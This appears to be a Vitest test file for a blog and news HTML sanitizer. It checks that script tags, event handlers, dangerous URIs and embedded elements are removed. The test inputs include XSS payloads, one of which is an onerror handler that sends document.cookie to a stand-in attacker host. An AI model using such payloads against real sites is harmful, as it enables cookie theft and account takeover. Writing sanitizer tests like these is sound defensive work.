import { describe, expect, it } from "vitest";
import {
  plainTextFromHtml,
  sanitizeBlogPostHtml,
  sanitizeCustomFieldValue,
} from "./blogs-sanitizer";

describe("Blog & News Rich Text Sanitizer (DEF-003, DEFECT-LOW-001, DEFECT-MEDIUM-006)", () => {
  it("allows safe semantic HTML formatting", () => {
    const safeHtml =
      "<h2>Introduction to Cardiology</h2><p>Heart health is <strong>vital</strong> and <em>essential</em>.</p><ul><li>Diet</li><li>Exercise</li></ul>";
    const result = sanitizeBlogPostHtml(safeHtml);
    expect(result).toContain("<h2>Introduction to Cardiology</h2>");
    expect(result).toContain("<strong>vital</strong>");
    expect(result).toContain("<em>essential</em>");
    expect(result).toContain("<li>Diet</li>");
  });

  it("strips executable <script> tags and embedded code", () => {
    const maliciousHtml = '<p>Normal text</p><script>alert("XSS Attack!")</script>';
    const result = sanitizeBlogPostHtml(maliciousHtml);
    expect(result).toBe("<p>Normal text</p>");
    expect(result).not.toContain("<script");
    expect(result).not.toContain("alert");
  });

  it("strips all on* inline event handlers", () => {
    const maliciousHtml = '<img src="https://example.com/pic.jpg" onerror="fetch(\'https://attacker.com/steal?cookie=\'+document.cookie)" onload="alert(1)" />';
    const result = sanitizeBlogPostHtml(maliciousHtml);
    expect(result).toContain('src="https://example.com/pic.jpg"');
    expect(result).not.toContain("onerror");
    expect(result).not.toContain("onload");
    expect(result).not.toContain("attacker.com");
  });

  it("blocks javascript: and vbscript: URIs in links and images", () => {
    const maliciousHtml = '<a href="javascript:alert(document.cookie)">Click here</a><a href="vbscript:msgbox(1)">VisualBasic</a>';
    const result = sanitizeBlogPostHtml(maliciousHtml);
    expect(result).not.toContain("javascript:");
    expect(result).not.toContain("vbscript:");
    expect(result).not.toContain("alert");
  });

  it("adds rel='noopener noreferrer' to external target='_blank' links", () => {
    const linkHtml = '<a href="https://example.com/research" target="_blank">External Study</a>';
    const result = sanitizeBlogPostHtml(linkHtml);
    expect(result).toContain('rel="noopener noreferrer"');
  });

  it("blocks iframe, object, embed, style, base, and form injection", () => {
    const dirty = '<iframe src="https://evil.com"></iframe><object data="bad.swf"></object><embed src="bad.pdf"></embed><form action="/hack"><input type="text"/></form><style>body { display: none; }</style>';
    const result = sanitizeBlogPostHtml(dirty);
    expect(result).toBe("");
  });

  it("blocks SVG-based XSS payloads", () => {
    const svgXss = '<svg><script>alert(1)</script><circle cx="10" cy="10" r="5"/></svg>';
    const result = sanitizeBlogPostHtml(svgXss);
    expect(result).not.toContain("<script");
    expect(result).not.toContain("alert");
    expect(result).not.toContain("<svg");
  });

  it("extracts clean plain text safely in both SSR and browser", () => {
    const rich = "<h1>Article Title</h1><p>First paragraph with <a href='#'>link</a>.</p>";
    const text = plainTextFromHtml(rich);
    expect(text).toBe("Article TitleFirst paragraph with link.");
  });

  it("sanitizes custom field strings containing dangerous HTML", () => {
    const dirtyCustom = '<img src="x" onerror="alert(document.domain)">Clinical Summary';
    const cleaned = sanitizeCustomFieldValue(dirtyCustom);
    expect(cleaned).not.toContain("onerror");
    expect(cleaned).not.toContain("alert");
    expect(cleaned).toContain("Clinical Summary");
  });

  it("preserves non-HTML custom field primitives", () => {
    expect(sanitizeCustomFieldValue(42)).toBe(42);
    expect(sanitizeCustomFieldValue(true)).toBe(true);
    expect(sanitizeCustomFieldValue(null)).toBe(null);
    expect(sanitizeCustomFieldValue(["Normal tag 1", "Normal tag 2"])).toEqual([
      "Normal tag 1",
      "Normal tag 2",
    ]);
  });
});
